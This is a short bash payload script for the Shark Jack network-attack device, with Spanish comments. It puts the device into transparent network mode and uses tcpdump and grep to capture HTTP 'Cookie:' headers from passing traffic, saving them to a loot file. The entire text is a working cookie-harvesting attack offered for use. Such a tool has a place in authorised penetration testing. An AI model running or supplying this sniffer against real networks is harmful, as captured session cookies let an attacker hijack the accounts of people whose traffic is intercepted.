#!/bin/bash
# Shark Jack script: Detect HTTP Cookies

LED SETUP
# Configurar la interfaz de red en modo TRANSPARENT
NETMODE TRANSPARENT
LED ATTACK

# Iniciar captura de paquetes y buscar parámetros de cookies HTTP
tcpdump -i eth0 -A -l | grep -i "Cookie:" >> /root/loot/http_cookies.txt

LED FINISH